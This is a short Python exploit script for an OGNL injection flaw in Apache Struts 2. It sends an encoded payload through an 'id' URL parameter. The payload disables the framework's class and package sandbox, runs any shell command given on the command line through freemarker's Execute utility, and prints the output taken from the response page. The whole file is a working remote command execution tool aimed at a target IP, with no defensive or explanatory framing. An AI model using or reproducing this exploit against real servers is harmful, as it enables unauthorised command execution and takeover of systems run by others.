import requests
import sys
import os
from lxml import etree

def exploit(dst_addr,cmd):
	payload="%25%7b(%23application.map%3d%23application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0%2c0)+%2b+(%23application.map.setBean(%23request.get('struts.valueStack'))+%3d%3d+true).toString().substring(0%2c0)+%2b+(%23application.map2%3d%23application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0%2c0)+%2b(%23application.map2.setBean(%23application.get('map').get('context'))+%3d%3d+true).toString().substring(0%2c0)+%2b+(%23application.map3%3d%23application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0%2c0)+%2b+(%23application.map3.setBean(%23application.get('map2').get('memberAccess'))+%3d%3d+true).toString().substring(0%2c0)+%2b+(%23application.get('map3').put('excludedPackageNames'%2c%23application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet'))+%3d%3d+true).toString().substring(0%2c0)+%2b+(%23application.get('map3').put('excludedClasses'%2c%23application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet'))+%3d%3d+true).toString().substring(0%2c0)+%2b(%23application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec(%7b"+cmd+"'}))}"
	dst_addr=dst_addr+"/?id="+payload
	resp=requests.get(dst_addr, verify=False)
	page=etree.HTML(resp.text)
	try :
		data = page.xpath('//a[@id]/@id')
	except Exception as ex:
		raise SystemExit(ex)
		
	print("[response]")
	if data:
		print(data[0])
	else :
		print("Not vuln")
	
if __name__ == "__main__":
	if len(sys.argv) < 3:
			print ('Usage: python %s <dst_ip> <command>' % os.path.basename(sys.argv[0]))
			sys.exit()	
	if len(sys.argv) == 4 and sys.argv=='-s':
		addr = "https://"+sys.argv[1]
	else:
		addr = "http://"+sys.argv[1]
		
	exploit(addr,sys.argv[2])
